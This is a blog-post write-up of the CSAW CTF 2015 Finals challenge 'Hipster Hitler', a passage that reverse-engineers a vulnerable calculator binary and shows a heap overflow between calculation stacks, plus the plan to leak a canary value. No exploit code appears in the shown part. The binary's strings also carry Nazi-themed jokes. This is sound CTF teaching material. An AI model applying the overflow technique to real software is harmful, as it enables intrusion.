<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title>CSAW CTF 2015 Finals - Hipster Hitler &#8211; A Little (1 << 3) + y</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="description" content="Hitler is too mainstream">
    <meta name="author" content="Chris">
    <meta name="keywords" content="ctf, exploit, heap, overflow, shellcode">
    <link rel="canonical" href="http://localhost:4000/ctf/exploit/heap/overflow/shellcode/2015/11/25/hipster-csaw-finals/">
    <link rel="alternate" type="application/rss+xml" title="RSS Feed for A Little (1 << 3) + y" href="/feed.xml" />

    <!-- Custom CSS -->
    <link rel="stylesheet" href="/css/pixyll.css?201807100044" type="text/css">
    <link rel="stylesheet" href="/css/prism.css?201807100044" type="text/css">

    <!-- Fonts -->
    <link href='//fonts.googleapis.com/css?family=Merriweather:900,900italic,300,300italic' rel='stylesheet' type='text/css'>
    <link href='//fonts.googleapis.com/css?family=Lato:900,300' rel='stylesheet' type='text/css'>
    
      <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css" rel="stylesheet">
    


    <!-- Open Graph -->
    <!-- From: https://github.com/mmistakes/hpstr-jekyll-theme/blob/master/_includes/head.html -->
    <meta property="og:locale" content="en_US">
    <meta property="og:type" content="article">
    <meta property="og:title" content="CSAW CTF 2015 Finals - Hipster Hitler">
    <meta property="og:description" content="Blades out like Wolverine, but it was all a huge act man. ~ octobersveryown">
    <meta property="og:url" content="http://localhost:4000/ctf/exploit/heap/overflow/shellcode/2015/11/25/hipster-csaw-finals/">
    <meta property="og:site_name" content="A Little (1 &lt;&lt; 3) + y">

    <!-- Twitter Card -->
    <meta name="twitter:card" content="summary" />
    
        <meta name="twitter:site" content="@breadchris" />
    
    <meta name="twitter:title" content="CSAW CTF 2015 Finals - Hipster Hitler" />
    <meta name="twitter:description" content="Hitler is too mainstream" />
    <meta name="twitter:url" content="http://localhost:4000/ctf/exploit/heap/overflow/shellcode/2015/11/25/hipster-csaw-finals/" />

    <!-- Icons -->
    <link rel="apple-touch-icon" sizes="57x57" href="/apple-touch-icon-57x57.png">
    <link rel="apple-touch-icon" sizes="114x114" href="/apple-touch-icon-114x114.png">
    <link rel="apple-touch-icon" sizes="72x72" href="/apple-touch-icon-72x72.png">
    <link rel="apple-touch-icon" sizes="144x144" href="/apple-touch-icon-144x144.png">
    <link rel="apple-touch-icon" sizes="60x60" href="/apple-touch-icon-60x60.png">
    <link rel="apple-touch-icon" sizes="120x120" href="/apple-touch-icon-120x120.png">
    <link rel="apple-touch-icon" sizes="76x76" href="/apple-touch-icon-76x76.png">
    <link rel="apple-touch-icon" sizes="152x152" href="/apple-touch-icon-152x152.png">
    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon-180x180.png">
    <link rel="icon" type="image/png" href="/favicon-192x192.png" sizes="192x12">
    <link rel="icon" type="image/png" href="/favicon-160x160.png" sizes="160x160">
    <link rel="icon" type="image/png" href="/favicon-96x96.png" sizes="96x96">
    <link rel="icon" type="image/png" href="/favicon-16x16.png" sizes="16x16">
    <link rel="icon" type="image/png" href="/favicon-32x32.png" sizes="32x32">
        
    
</head>

<body class="site">
  <div class="site-wrap">
    <header class="site-header px2 px-responsive">
  <div class="mt2 wrap">
    <div class="measure">
      <a href="http://localhost:4000" class="site-title">A Little (1 << 3) + y</a>
      <nav class="site-nav">
        <a href="/about/">About</a>
<a href="/contact/">Contact</a>

      </nav>
      <div class="clearfix"></div>
      
        <div class="social-icons">
  <div class="left">
    
      <a class="fa fa-github" href="https://github.com/breadchris"></a>
    
    
    <a class="fa fa-rss" href="/feed.xml"></a>
    
      <a class="fa fa-twitter" href="https://twitter.com/breadchris"></a>
    
    
    
    
    
  </div>
  <div class="right">
    
    
    
  </div>
</div>
<div class="clearfix"></div>

      
    </div>
  </div>
</header>


    <div class="post p2 p-responsive wrap" role="main">
      <div class="measure">
        


<div class="post-header mb2">
  <h1>CSAW CTF 2015 Finals - Hipster Hitler</h1>
  <span class="post-meta">Nov 25, 2015</span><br>
    
  <span class="post-meta small">
  
    21 minute read
  
  </span>
</div>

<article class="post-content">
  <h3 id="tl-dr">TL; DR</h3>
<ul>
  <li>Overflow</li>
  <li>Shellcode</li>
  <li>Hitler</li>
</ul>

<p>CSAW CTF Finals were really dope, not just because we had <a href="https://www.youtube.com/watch?v=3Q1V7AUD1JQ">Pwnadventure Z</a>, but also because of all the really cool people that were there.</p>

<p>Hipster (or Hipster Hitler) was a basic exploitation challenge that was fun to exploit. It is more or less similar to Contacts which appeared in CSAW CTF Prelims.</p>

<p>Let’s check it out:</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="o">[</span>vagrant@kamino csaw2015finals]<span class="nv">$ </span>file hipster
hipster: ELF 32-bit LSB  executable, Intel 80386, version 1 <span class="o">(</span>SYSV<span class="o">)</span>, dynamically linked <span class="o">(</span>uses shared libs<span class="o">)</span>, <span class="k">for </span>GNU/Linux 2.6.24, BuildID[sha1]<span class="o">=</span>b23801cfaa0d9395b962e7115b15f85de01b22ca, stripped</code></pre></figure>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="o">[</span>vagrant@kamino csaw2015finals]<span class="nv">$ </span>~/Template/checksec.sh --file hipster
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   hipster</code></pre></figure>

<p>NX is disabled which suggests that we are more than likely gonna wanna be using shellcode (unless they are tryna trick us :3).</p>

<p>Now let’s checkout what this thing actually looks like:</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="o">[</span>vagrant@kamino csaw2015finals]<span class="nv">$ </span>./hipster
Sieg Heil!
Welcome to Hipster Hitler<span class="s1">'s Pocket Calculator!
My computing resources await you, mein Führer.
We now use Reverse Polish Notation as a result of our recent conquest of Poland.
All commands are prefixed with '</span>:<span class="s1">'.
Type :help for a list of commands.
==&gt; :help
His Excellency'</span>s available commands:
top  <span class="o">=</span>&gt; Display top value of the currently selected stack.
new  <span class="o">=</span>&gt; Create a new stack and switch to it.
del  <span class="o">=</span>&gt; Delete currently selected stack.
disp <span class="o">=</span>&gt; Display all values on stack.
next <span class="o">=</span>&gt; Switch between active stacks.
quit <span class="o">=</span>&gt; Exit the calculator.
<span class="o">==</span>&gt;</code></pre></figure>

<p>So from inital inspection, this appears to be a stack based calculator in which you can create different different calculation stacks. And apparently “Reverse Polish Notation” is just postfix notation which just makes it easier to program a stack based calculator.</p>

<p>Given that this is a calculator themed for Hitler, I figured that the rest of strings in this binary were also pretty funny:</p>

<figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="p">.</span><span class="n">rodata</span><span class="o">:</span><span class="mi">0804</span><span class="n">A322</span> <span class="n">aThatCommandIsN</span> <span class="kt">db</span> <span class="err">'</span><span class="n">That</span> <span class="n">command</span> <span class="n">is</span> <span class="k">not</span> <span class="n">yet</span> <span class="n">implemented</span><span class="p">,</span> <span class="n">mein</span> <span class="n">F</span><span class="o">++</span><span class="n">hrer</span><span class="err">!'</span><span class="p">,</span><span class="mi">0</span><span class="n">Ah</span>
<span class="p">.</span><span class="n">rodata</span><span class="o">:</span><span class="mi">0804</span><span class="n">A322</span>                                         <span class="c">; DATA XREF: sub_80490E0+F8o</span>
<span class="p">.</span><span class="n">rodata</span><span class="o">:</span><span class="mi">0804</span><span class="n">A322</span>                 <span class="kt">db</span> <span class="err">'</span><span class="n">Please</span> <span class="kt">do</span> <span class="k">not</span> <span class="n">feed</span> <span class="n">me</span> <span class="n">to</span> <span class="n">the</span> <span class="n">dogs</span><span class="err">!'</span><span class="p">,</span><span class="mi">0</span><span class="n">Ah</span><span class="p">,</span><span class="mi">0</span>
<span class="p">.</span><span class="n">rodata</span><span class="o">:</span><span class="mi">0804</span><span class="n">A379</span> <span class="n">aCaughtPossible</span> <span class="kt">db</span> <span class="err">'</span><span class="n">Caught</span> <span class="n">possible</span> <span class="n">Polish</span> <span class="n">rebel</span> <span class="n">intruder</span><span class="p">,</span> <span class="n">mein</span> <span class="n">F</span><span class="o">++</span><span class="n">hrer</span><span class="err">!'</span><span class="p">,</span><span class="mi">0</span><span class="n">Ah</span>
<span class="p">.</span><span class="n">rodata</span><span class="o">:</span><span class="mi">0804</span><span class="n">A379</span>                                         <span class="c">; DATA XREF: sub_8049280+3Bo</span>
<span class="p">.</span><span class="n">rodata</span><span class="o">:</span><span class="mi">0804</span><span class="n">A379</span>                 <span class="kt">db</span> <span class="err">'</span><span class="n">I</span> <span class="n">shall</span> <span class="n">execute</span> <span class="n">him</span> <span class="n">immediately</span><span class="p">...</span><span class="err">'</span><span class="p">,</span><span class="mi">0</span><span class="n">Ah</span><span class="p">,</span><span class="mi">0</span>
<span class="p">.</span><span class="n">rodata</span><span class="o">:</span><span class="mi">0804</span><span class="n">A3D2</span> <span class="n">aSiegHeilWelcom</span> <span class="kt">db</span> <span class="err">'</span><span class="n">Sieg</span> <span class="n">Heil</span><span class="err">!'</span><span class="p">,</span><span class="mi">0</span><span class="n">Ah</span>     <span class="c">; DATA XREF: sub_8049450+Bo</span>
<span class="p">.</span><span class="n">rodata</span><span class="o">:</span><span class="mi">0804</span><span class="n">A3D2</span>                 <span class="kt">db</span> <span class="err">'</span><span class="n">Welcome</span> <span class="n">to</span> <span class="n">Hipster</span> <span class="n">Hitler</span><span class="err">'</span><span class="p">,</span><span class="mi">27</span><span class="n">h</span><span class="p">,</span><span class="err">'</span><span class="n">s</span> <span class="n">Pocket</span> <span class="n">Calculator</span><span class="err">!'</span><span class="p">,</span><span class="mi">0</span><span class="n">Ah</span>
<span class="p">.</span><span class="n">rodata</span><span class="o">:</span><span class="mi">0804</span><span class="n">A3D2</span>                 <span class="kt">db</span> <span class="err">'</span><span class="n">My</span> <span class="n">computing</span> <span class="n">resources</span> <span class="n">await</span> <span class="n">you</span><span class="p">,</span> <span class="n">mein</span> <span class="n">F</span><span class="o">++</span><span class="n">hrer</span><span class="p">.</span><span class="err">'</span><span class="p">,</span><span class="mi">0</span><span class="n">Ah</span>
<span class="p">.</span><span class="n">rodata</span><span class="o">:</span><span class="mi">0804</span><span class="n">A3D2</span>                 <span class="kt">db</span> <span class="err">'</span><span class="n">We</span> <span class="n">now</span> <span class="n">use</span> <span class="n">Reverse</span> <span class="n">Polish</span> <span class="n">Notation</span> <span class="n">as</span> <span class="n">a</span> <span class="n">result</span> <span class="n">of</span> <span class="n">our</span> <span class="n">recent</span> <span class="n">conq</span><span class="err">'</span>
<span class="p">.</span><span class="n">rodata</span><span class="o">:</span><span class="mi">0804</span><span class="n">A3D2</span>                 <span class="kt">db</span> <span class="err">'</span><span class="n">uest</span> <span class="n">of</span> <span class="n">Poland</span><span class="p">.</span><span class="err">'</span><span class="p">,</span><span class="mi">0</span><span class="n">Ah</span>
<span class="p">.</span><span class="n">rodata</span><span class="o">:</span><span class="mi">0804</span><span class="n">A3D2</span>                 <span class="kt">db</span> <span class="err">'</span><span class="n">All</span> <span class="n">commands</span> <span class="n">are</span> <span class="n">prefixed</span> <span class="n">with</span> <span class="err">'</span><span class="p">,</span><span class="mi">27</span><span class="n">h</span><span class="p">,</span><span class="sc">':'</span><span class="p">,</span><span class="mi">27</span><span class="n">h</span><span class="p">,</span><span class="sc">'.'</span><span class="p">,</span><span class="mi">0</span><span class="n">Ah</span>
<span class="p">.</span><span class="n">rodata</span><span class="o">:</span><span class="mi">0804</span><span class="n">A3D2</span>                 <span class="kt">db</span> <span class="err">'</span><span class="n">Type</span> <span class="o">:</span><span class="n">help</span> <span class="n">for</span> <span class="n">a</span> <span class="n">list</span> <span class="n">of</span> <span class="n">commands</span><span class="p">.</span><span class="err">'</span><span class="p">,</span><span class="mi">0</span><span class="n">Ah</span><span class="p">,</span><span class="mi">0</span>
<span class="p">.</span><span class="n">rodata</span><span class="o">:</span><span class="mi">0804</span><span class="n">A4D5</span> <span class="n">asc_804A4D5</span>     <span class="kt">db</span> <span class="err">'</span><span class="o">==&gt;</span> <span class="err">'</span><span class="p">,</span><span class="mi">0</span>             <span class="c">; DATA XREF: sub_8049480+82o</span>
<span class="p">.</span><span class="n">rodata</span><span class="o">:</span><span class="mi">0804</span><span class="n">A4DA</span> <span class="n">aFarewallMeinFH</span> <span class="kt">db</span> <span class="err">'</span><span class="n">Farewall</span><span class="p">,</span> <span class="n">mein</span> <span class="n">F</span><span class="o">++</span><span class="n">hrer</span><span class="err">!'</span><span class="p">,</span><span class="mi">0</span><span class="n">Ah</span>
<span class="p">.</span><span class="n">rodata</span><span class="o">:</span><span class="mi">0804</span><span class="n">A4DA</span>                                         <span class="c">; DATA XREF: sub_8049480+11Co</span>
<span class="p">.</span><span class="n">rodata</span><span class="o">:</span><span class="mi">0804</span><span class="n">A4DA</span>                 <span class="kt">db</span> <span class="err">'</span><span class="n">Have</span> <span class="n">a</span> <span class="n">good</span> <span class="n">time</span> <span class="k">in</span> <span class="n">France</span><span class="err">!'</span><span class="p">,</span><span class="mi">0</span><span class="n">Ah</span><span class="p">,</span><span class="mi">0</span>
<span class="p">.</span><span class="n">rodata</span><span class="o">:</span><span class="mi">0804</span><span class="n">A50F</span> <span class="n">aUnableToSetSig</span> <span class="kt">db</span> <span class="err">'</span><span class="n">Unable</span> <span class="n">to</span> <span class="n">set</span> <span class="n">SIGCHLD</span> <span class="n">handler</span><span class="err">'</span><span class="p">,</span><span class="mi">0</span>
<span class="p">.</span><span class="n">rodata</span><span class="o">:</span><span class="mi">0804</span><span class="n">A50F</span>                                         <span class="c">; DATA XREF: .text:08049640o</span>
<span class="p">.</span><span class="n">rodata</span><span class="o">:</span><span class="mi">0804</span><span class="n">A52D</span> <span class="n">aUnableToCreate</span> <span class="kt">db</span> <span class="err">'</span><span class="n">Unable</span> <span class="n">to</span> <span class="n">create</span> <span class="n">socket</span><span class="err">'</span><span class="p">,</span><span class="mi">0</span> <span class="c">; DATA XREF: .text:0804976Eo</span>
<span class="p">.</span><span class="n">rodata</span><span class="o">:</span><span class="mi">0804</span><span class="n">A545</span> <span class="n">aUnableToSetSoc</span> <span class="kt">db</span> <span class="err">'</span><span class="n">Unable</span> <span class="n">to</span> <span class="n">set</span> <span class="n">socket</span> <span class="n">reuse</span> <span class="n">option</span><span class="err">'</span><span class="p">,</span><span class="mi">0</span>
<span class="p">.</span><span class="n">rodata</span><span class="o">:</span><span class="mi">0804</span><span class="n">A545</span>                                         <span class="c">; DATA XREF: .text:080497E1o</span>
<span class="p">.</span><span class="n">rodata</span><span class="o">:</span><span class="mi">0804</span><span class="n">A567</span> <span class="n">aUnableToBindSo</span> <span class="kt">db</span> <span class="err">'</span><span class="n">Unable</span> <span class="n">to</span> <span class="n">bind</span> <span class="n">socket</span><span class="err">'</span><span class="p">,</span><span class="mi">0</span> <span class="c">; DATA XREF: .text:08049883o</span>
<span class="p">.</span><span class="n">rodata</span><span class="o">:</span><span class="mi">0804</span><span class="n">A567</span>                                         <span class="c">; .text:0804997Eo</span>
<span class="p">.</span><span class="n">rodata</span><span class="o">:</span><span class="mi">0804</span><span class="n">A57D</span> <span class="n">aUnableToListen</span> <span class="kt">db</span> <span class="err">'</span><span class="n">Unable</span> <span class="n">to</span> <span class="n">listen</span> <span class="n">on</span> <span class="n">socket</span><span class="err">'</span><span class="p">,</span><span class="mi">0</span>
<span class="p">.</span><span class="n">rodata</span><span class="o">:</span><span class="mi">0804</span><span class="n">A57D</span>                                         <span class="c">; DATA XREF: .text:080499D8o</span>
<span class="p">.</span><span class="n">rodata</span><span class="o">:</span><span class="mi">0804</span><span class="n">A598</span> <span class="c">; char aUnableToFindUs[]</span>
<span class="p">.</span><span class="n">rodata</span><span class="o">:</span><span class="mi">0804</span><span class="n">A598</span> <span class="n">aUnableToFindUs</span> <span class="kt">db</span> <span class="err">'</span><span class="n">Unable</span> <span class="n">to</span> <span class="n">find</span> <span class="n">user</span><span class="err">'</span><span class="p">,</span><span class="mi">0</span> <span class="c">; DATA XREF: sub_8049C00+25o</span>
<span class="p">.</span><span class="n">rodata</span><span class="o">:</span><span class="mi">0804</span><span class="n">A5AC</span> <span class="c">; char aUnableToRemove[]</span>
<span class="p">.</span><span class="n">rodata</span><span class="o">:</span><span class="mi">0804</span><span class="n">A5AC</span> <span class="n">aUnableToRemove</span> <span class="kt">db</span> <span class="err">'</span><span class="n">Unable</span> <span class="n">to</span> <span class="n">remove</span> <span class="n">extra</span> <span class="n">groups</span><span class="err">'</span><span class="p">,</span><span class="mi">0</span>
<span class="p">.</span><span class="n">rodata</span><span class="o">:</span><span class="mi">0804</span><span class="n">A5AC</span>                                         <span class="c">; DATA XREF: sub_8049C00+64o</span>
<span class="p">.</span><span class="n">rodata</span><span class="o">:</span><span class="mi">0804</span><span class="n">A5CA</span> <span class="c">; char aUnableToChange[]</span>
<span class="p">.</span><span class="n">rodata</span><span class="o">:</span><span class="mi">0804</span><span class="n">A5CA</span> <span class="n">aUnableToChange</span> <span class="kt">db</span> <span class="err">'</span><span class="n">Unable</span> <span class="n">to</span> <span class="n">change</span> <span class="n">GID</span><span class="err">'</span><span class="p">,</span><span class="mi">0</span> <span class="c">; DATA XREF: sub_8049C00+95o</span>
<span class="p">.</span><span class="n">rodata</span><span class="o">:</span><span class="mi">0804</span><span class="n">A5DF</span> <span class="c">; char aUnableToChan_0[]</span>
<span class="p">.</span><span class="n">rodata</span><span class="o">:</span><span class="mi">0804</span><span class="n">A5DF</span> <span class="n">aUnableToChan_0</span> <span class="kt">db</span> <span class="err">'</span><span class="n">Unable</span> <span class="n">to</span> <span class="n">change</span> <span class="n">UID</span><span class="err">'</span><span class="p">,</span><span class="mi">0</span> <span class="c">; DATA XREF: sub_8049C00+C6o</span>
<span class="p">.</span><span class="n">rodata</span><span class="o">:</span><span class="mi">0804</span><span class="n">A5F4</span> <span class="c">; char aUnableToChan_1[]</span>
<span class="p">.</span><span class="n">rodata</span><span class="o">:</span><span class="mi">0804</span><span class="n">A5F4</span> <span class="n">aUnableToChan_1</span> <span class="kt">db</span> <span class="err">'</span><span class="n">Unable</span> <span class="n">to</span> <span class="n">change</span> <span class="n">current</span> <span class="n">directory</span><span class="err">'</span><span class="p">,</span><span class="mi">0</span>
<span class="p">.</span><span class="n">rodata</span><span class="o">:</span><span class="mi">0804</span><span class="n">A5F4</span>                                         <span class="c">; DATA XREF: sub_8049C00+F7o</span>
<span class="p">.</span><span class="n">rodata</span><span class="o">:</span><span class="mi">0804</span><span class="n">A617</span> <span class="c">; char file[]</span>
<span class="p">.</span><span class="n">rodata</span><span class="o">:</span><span class="mi">0804</span><span class="n">A617</span> <span class="n">file</span>            <span class="kt">db</span> <span class="err">'</span><span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">urandom</span><span class="err">'</span><span class="p">,</span><span class="mi">0</span>     <span class="c">; DATA XREF: sub_8049B20+11o</span></code></pre></figure>

<p>…See something interesting in there?
Well for starters at <code class="highlighter-rouge">0804A617</code> we have a mention of <code class="highlighter-rouge">/dev/urandom</code> which suggests some sort of random values being read in. But even more interesting is that there are <code class="highlighter-rouge">Unable to bind socket</code> and <code class="highlighter-rouge">Unable to listen on socket</code> which only appear in a server application, but this isn’t a server… I guess we will keep our eyes open for any other mention of this socket code.</p>

<p>So the first thing we should really just do is play around with the program and see if we can get an easy crash (always a good thing to try first, you can almost always get a crash doing this in exploitation problems).</p>

<p>Going on a hunch about how this program stored its stacks, I got a crash pretty quickly.</p>

<pre>
[vagrant@kamino csaw2015finals]$ ./hipster
Sieg Heil!
Welcome to Hipster Hitler's Pocket Calculator!
My computing resources await you, mein Führer.
We now use Reverse Polish Notation as a result of our recent conquest of Poland.
All commands are prefixed with ':'.
Type :help for a list of commands.
==&gt; :new
Switching to new stack, mein Führer.
==&gt; :new
Switching to new stack, mein Führer.
==&gt; :next
Switched to stack #0.
==&gt; 111111111111111111111111111111111111111111111111111111111111111111111111111111111111
==&gt; ==&gt; ==&gt; ==&gt; ==&gt; ==&gt; :next
Switched to stack #1.
==&gt; :top
zsh: segmentation fault  ./hipster

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0x804b8b0 ("Switched to stack #1.\n")
ESI: 0x1
[-------------------------------------code-------------------------------------]
=&gt; 0x8048b21:   mov    esi,DWORD PTR [esi-0x4]
</pre>

<p>So we can overflow from one stack into another as it looks like the program is attempting to dereference a <code class="highlighter-rouge">1</code> which is what we input into the program.</p>

<p>Now we should checkout how these stacks are actually stored in memory.</p>

<p>Poking around <code class="highlighter-rouge">create_stack</code> (remember, there are no symbols in this program so I’m logically naming all these functions) we can see how big each stack is:</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="n">current_stack</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mi">168u</span><span class="p">);</span></code></pre></figure>

<p>We also see <code class="highlighter-rouge">dword_804B8F0</code> being stored in the location pointed to by <code class="highlighter-rouge">esi</code> (a pointer to the current stack)</p>

<figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">08048</span><span class="n">DEB</span><span class="o">:</span>     <span class="k">mov</span>     <span class="n">edx</span><span class="p">,</span> <span class="n">ds</span><span class="o">:</span><span class="n">dword_804B8F0</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">08048</span><span class="n">DF1</span><span class="o">:</span>     <span class="k">mov</span>     <span class="n">esi</span><span class="p">,</span> <span class="err">[</span><span class="n">ebp</span><span class="o">+</span><span class="n">var_C</span><span class="err">]</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">08048</span><span class="n">DF4</span><span class="o">:</span>     <span class="k">mov</span>     <span class="n">esi</span><span class="p">,</span> <span class="n">ds</span><span class="o">:</span><span class="n">ptr</span><span class="err">[</span><span class="n">esi</span><span class="o">*</span><span class="mi">4</span><span class="err">]</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">08048</span><span class="n">DFB</span><span class="o">:</span>     <span class="k">mov</span>     <span class="p">[esi],</span> <span class="n">edx</span></code></pre></figure>

<p>If we check the xrefs of this value we see it is first assigned here:</p>

<figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">080494</span><span class="n">F3</span><span class="o">:</span>     <span class="k">call</span>    <span class="n">_rand</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">080494</span><span class="n">F8</span><span class="o">:</span>     <span class="k">mov</span>     <span class="n">ds</span><span class="o">:</span><span class="n">dword_804B8F0</span><span class="p">,</span> <span class="n">eax</span></code></pre></figure>

<p>And checked in <code class="highlighter-rouge">do_calcuation</code>:</p>

<figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">080492</span><span class="n">A0</span><span class="o">:</span>     <span class="k">mov</span>     <span class="n">eax</span><span class="p">,</span> <span class="n">ds</span><span class="o">:</span><span class="n">dword_804B888</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">080492</span><span class="n">A5</span><span class="o">:</span>     <span class="k">mov</span>     <span class="n">eax</span><span class="p">,</span> <span class="n">ds</span><span class="o">:</span><span class="n">ptr</span><span class="err">[</span><span class="n">eax</span><span class="o">*</span><span class="mi">4</span><span class="err">]</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">080492</span><span class="n">AC</span><span class="o">:</span>     <span class="k">mov</span>     <span class="n">eax</span><span class="p">,</span> <span class="p">[eax]</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">080492</span><span class="n">AE</span><span class="o">:</span>     <span class="k">cmp</span>     <span class="n">eax</span><span class="p">,</span> <span class="n">ds</span><span class="o">:</span><span class="n">dword_804B8F0</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">080492</span><span class="n">B4</span><span class="o">:</span>     <span class="k">jz</span>      <span class="n">short</span> <span class="n">loc_80492EB</span></code></pre></figure>

<p>Just a guess right now, but it looks like this value is some sort of stack canary that checks if we have overflowed from one stack into another. So we are going to have to leak this value out somehow before we do our overflow.</p>

<p>Something else that is interesting that is happening in <code class="highlighter-rouge">create_stack</code> is:</p>

<figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">08048</span><span class="n">DD1</span><span class="o">:</span>     <span class="k">mov</span>     <span class="n">edx</span><span class="p">,</span> <span class="err">[</span><span class="n">ebp</span><span class="o">+</span><span class="n">var_C</span><span class="err">]</span>   <span class="c">; edx is the index of the current stack</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">08048</span><span class="n">DD4</span><span class="o">:</span>     <span class="k">mov</span>     <span class="n">edx</span><span class="p">,</span> <span class="n">ds</span><span class="o">:</span><span class="n">ptr</span><span class="err">[</span><span class="n">edx</span><span class="o">*</span><span class="mi">4</span><span class="err">]</span> <span class="c">; edx is a pointer to the current stack</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">08048</span><span class="n">DDB</span><span class="o">:</span>     <span class="k">add</span>     <span class="n">edx</span><span class="p">,</span> <span class="mi">8</span>             <span class="c">; Go 8 bytes into the current stack</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">08048</span><span class="n">DDE</span><span class="o">:</span>     <span class="k">mov</span>     <span class="n">esi</span><span class="p">,</span> <span class="err">[</span><span class="n">ebp</span><span class="o">+</span><span class="n">var_C</span><span class="err">]</span>   <span class="c">; esi is the index of the current stack</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">08048</span><span class="n">DE1</span><span class="o">:</span>     <span class="k">mov</span>     <span class="n">esi</span><span class="p">,</span> <span class="n">ds</span><span class="o">:</span><span class="n">ptr</span><span class="err">[</span><span class="n">esi</span><span class="o">*</span><span class="mi">4</span><span class="err">]</span> <span class="c">; esi is a pointer to the current stack</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">08048</span><span class="n">DE8</span><span class="o">:</span>     <span class="k">mov</span>     <span class="err">[</span><span class="n">esi</span><span class="o">+</span><span class="mi">4</span><span class="err">]</span><span class="p">,</span> <span class="n">edx</span>       <span class="c">; store a pointer 8 bytes into the current stack</span>
                                               <span class="c">; into our stack</span></code></pre></figure>

<p>Here we see the current stack storing a pointer to 8 bytes into itself in itself. Looking at <code class="highlighter-rouge">get_stack_top</code> we see that this pointer is a pointer to the top of the stack.</p>

<figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">08048</span><span class="n">B17</span><span class="o">:</span>     <span class="k">mov</span>     <span class="n">esi</span><span class="p">,</span> <span class="n">ds</span><span class="o">:</span><span class="n">ptr</span><span class="err">[</span><span class="n">esi</span><span class="o">*</span><span class="mi">4</span><span class="err">]</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">08048</span><span class="n">B1E</span><span class="o">:</span>     <span class="k">mov</span>     <span class="n">esi</span><span class="p">,</span> <span class="err">[</span><span class="n">esi</span><span class="o">+</span><span class="mi">4</span><span class="err">]</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">08048</span><span class="n">B21</span><span class="o">:</span>     <span class="k">mov</span>     <span class="n">esi</span><span class="p">,</span> <span class="err">[</span><span class="n">esi</span><span class="o">-</span><span class="mi">4</span><span class="err">]</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">08048</span><span class="n">B24</span><span class="o">:</span>     <span class="k">mov</span>     <span class="p">[esp],</span> <span class="n">eax</span>      <span class="c">; s</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">08048</span><span class="n">B27</span><span class="o">:</span>     <span class="k">mov</span>     <span class="n">dword</span> <span class="n">ptr</span> <span class="err">[</span><span class="n">esp</span><span class="o">+</span><span class="mi">4</span><span class="err">]</span><span class="p">,</span> <span class="mi">40</span><span class="n">h</span> <span class="c">; maxlen</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">08048</span><span class="n">B2F</span><span class="o">:</span>     <span class="k">mov</span>     <span class="err">[</span><span class="n">esp</span><span class="o">+</span><span class="mi">8</span><span class="err">]</span><span class="p">,</span> <span class="n">edx</span>    <span class="c">; format</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">08048</span><span class="n">B33</span><span class="o">:</span>     <span class="k">mov</span>     <span class="err">[</span><span class="n">esp</span><span class="o">+</span><span class="mi">0</span><span class="n">Ch</span><span class="err">]</span><span class="p">,</span> <span class="n">esi</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">08048</span><span class="n">B37</span><span class="o">:</span>     <span class="k">mov</span>     <span class="err">[</span><span class="n">ebp</span><span class="o">+</span><span class="n">var_8</span><span class="err">]</span><span class="p">,</span> <span class="n">ecx</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">08048</span><span class="n">B3A</span><span class="o">:</span>     <span class="k">call</span>    <span class="n">_snprintf</span></code></pre></figure>

<p>But what is interesting here, is that in <code class="highlighter-rouge">create_stack</code> it stored a pointer 8 bytes into the stack, but when we go to print out the top value, <code class="highlighter-rouge">mov     esi, [esi-4]</code> we subtract 4 from this pointer. Let’s draw out what we conceptualize a stack to look like at this point:</p>

<pre>
[-------- top --------]
stack+0    random value
stack+4    pointer to top of stack
stack+8    numbers and stuff
...
stack+164  numbers and stuff
[-------- end --------]
</pre>

